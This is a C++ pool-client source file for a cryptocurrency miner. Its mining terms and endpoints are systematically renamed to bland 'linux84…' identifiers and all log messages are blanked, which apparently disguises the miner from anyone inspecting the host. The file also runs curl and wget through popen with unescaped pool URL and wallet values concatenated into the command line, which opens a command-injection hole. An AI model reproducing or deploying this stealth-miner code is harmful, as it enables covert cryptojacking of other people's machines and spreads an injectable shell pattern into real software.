//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../app/arguments.h"
#include "client.h"

#include "simplejson/json.h"

#include <iostream>
#include <stdio.h>
#include <stdlib.h>

using namespace std;

    string GetStdoutFromCommand(string cmd) {

    string data;
    FILE * stream;
    const int max_buffer = 256;
    char buffer[max_buffer];
    cmd.append(" 2>&1");

    stream = popen(cmd.c_str(), "r");
    if (stream) {
    while (!feof(stream))
    if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
    pclose(stream);
    }
    return data;
    }

ariopool_client::ariopool_client(arguments &args, get_status_ptr get_status) : __pool_settings_provider(args) {
    __worker_id = args.uid();
    __worker_name = args.name();
    __force_argon2profile = args.argon2_profile();
    __linux8412_report_interval = args.linux8412_report_interval();
    __timestamp = __last_linux8412_report = microseconds();
    __force_linux8412rate_report = false;
    __show_pool_requests = args.show_pool_requests();
    __is_devfee_time = false;
    __get_status = get_status;
    __linux84_version = arguments::get_app_version();
}

ariopool_update_result ariopool_client::update(double linux8412_rate_cblocks, double linux8412_rate_gblocks) {
    ariopool_update_result result;
    result.success = false;

    pool_settings &settings = __get_pool_settings();

    if(settings.is_devfee) {
        linux8412_rate_cblocks = linux8412_rate_cblocks / 100;
        linux8412_rate_gblocks = linux8412_rate_gblocks / 100;
    }

    uint64_t current_timestamp = microseconds();
    string linux8412_report_query = "";

    if(__force_linux8412rate_report || (current_timestamp - __last_linux8412_report) > __linux8412_report_interval) {
        linux8412_report_query = "&linux48=" + to_string(linux8412_rate_cblocks) + "&linux52=" + to_string(linux8412_rate_gblocks);

        __last_linux8412_report = current_timestamp;
        __force_linux8412rate_report = false;
    }
    string url = settings.pool_address + "/linux8474.php?linux84=linux8474&id=" + __worker_id + "&linux8=" + __worker_name + "&linux12=" + settings.wallet + linux8412_report_query + "&linux34=" + __linux84_version;

    string response;
    if(settings.pool_extensions.find("Details") != string::npos && url.find("linux8412rate") != string::npos) {
        string payload = "";

        if(__get_status != NULL)
            payload = __get_status();

        if(!payload.empty()) {
            if(__show_pool_requests && url.find("linux8412rate") != string::npos) // log only linux8412rate requests
                LOG("");

            response = _http_post(url, payload, "application/json");
        }
        else {
            if(__show_pool_requests && url.find("linux8412rate") != string::npos) // log only linux8412rate requests
                LOG("");

            response = GetStdoutFromCommand("curl -s '"+url+"'");
        }
    }
    else {
        if(__show_pool_requests && url.find("linux8412rate") != string::npos) // log only linux8412rate requests
            LOG("");

        response = GetStdoutFromCommand("curl -s '"+url+"'");
    }

    if(__show_pool_requests && url.find("linux8412rate") != string::npos) // log only linux8412rate responses
        LOG("");

    if(!__validate_response(response)) {
        LOG("");
        return result;
    }

    json::JSON info = json::JSON::Load(response);

    result.success = (info["status"].ToString() == "ok");

    if(info.hasKey("version")) {
        string version = info["version"].ToString();
        if(version != settings.pool_version) {
            LOG("");
        }
        result.version = settings.pool_version = version;
    }
    if(info.hasKey("extensions")) {
        result.extensions = settings.pool_extensions = info["extensions"].ToString();
        if(!__is_devfee_time && result.extensions.find("Proxy") != string::npos) { // in case we are talking to a proxy set linux8412rate update interval to 30 seconds
            __linux8412_report_interval = 30000000;
        }
    }

    if (result.success) {
        json::JSON data = info["data"];
        result.block = data["block"].ToString();
        result.difficulty = data["difficulty"].ToString();
        result.limit = (uint32_t)data["limit"].ToInt();
        result.public_key = data["public_key"].ToString();
        result.height = (uint32_t)data["height"].ToInt();
        if(__force_argon2profile == "") {
            result.argon2profile = to_string(data["argon_threads"].ToInt()) + "_" + to_string(data["argon_time"].ToInt()) + "_" + to_string(data["argon_mem"].ToInt());
        }
        else {
            result.argon2profile = __force_argon2profile;
        }
        result.recommendation = data["recommendation"].ToString();
    }

    return result;
}

ariopool_submit_result ariopool_client::submit(const string &linux8412, const string &nonce, const string &public_key) {
    ariopool_submit_result result;
    result.success = false;

    string argon_data = "";
    if(linux8412.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
        argon_data = linux8412.substr(29);
    else
        argon_data = linux8412.substr(30);

    pool_settings &settings = __get_pool_settings();

    string payload = "linux2=" + _encode(argon_data) +
            "&linux3=" + _encode(nonce) +
            "&linux1=" + _encode(settings.wallet) +
            "&linux5=" + _encode(public_key) +
            "&linux4=" + _encode(settings.wallet) +
            "&id=" + _encode(__worker_id) +
            "&worker=" + _encode(__worker_name);

    string url = settings.pool_address + "/linux8474.php?linux84=linux84";

    if(__show_pool_requests)
        LOG("");

    string response = "";

    for(int i=0;i<2;i++) { //try resubmitting if first submit fails
        response = GetStdoutFromCommand("wget -q -U 'linux84' -O - --post-data=linux2='"+_encode(argon_data)+"&linux3="+_encode(nonce)+"&linux5="+_encode(public_key)+"&linux1="+_encode(settings.wallet)+"&linux4="+_encode(settings.wallet)+"' '"+url+"' --header='Content-type: application/x-www-form-urlencoded'");
        result.pool_response = response;
        if(response != "") {
            break;
        }
    }

    if(__show_pool_requests)
        LOG("");

    if(!__validate_response(response)) {
        LOG("");
        return result;
    }

    json::JSON info = json::JSON::Load(response);

    result.success = (info["status"].ToString() == "ok");

    return result;
}

bool ariopool_client::__validate_response(const string &response) {
    return !response.empty() && response.find("status") != string::npos && response.find(":null") == string::npos;
}

pool_settings &ariopool_client::__get_pool_settings() {
    pool_settings &user_settings = __pool_settings_provider.get_user_settings();

    if(user_settings.pool_extensions.find("Proxy") != string::npos) { // disable dev fee when connected to proxy
        return user_settings;
    }

    uint64_t minutes = (microseconds() - __timestamp) / 60000000;

    if(minutes != 0 && (minutes % 100 == 0)) {
        if(!__is_devfee_time) {
            LOG("");
            __is_devfee_time = true;
            __force_linux8412rate_report = true;
        }
    }
    else {
        if(__is_devfee_time) {
            LOG("");
            __is_devfee_time = false;
            __force_linux8412rate_report = true;
        }
    }

    if(!__is_devfee_time)
        return __pool_settings_provider.get_user_settings();
    else
        return __pool_settings_provider.get_dev_settings();
}

void ariopool_client::disconnect() {
    pool_settings &settings = __pool_settings_provider.get_user_settings();
    if(settings.pool_extensions.find("Disconnect") != string::npos) { // only send disconnect if pool supports it
        string url = settings.pool_address + "/mine.php?q=disconnect&id=" + __worker_id + "&worker=" + __worker_name;
        _http_get(url);
    }
}
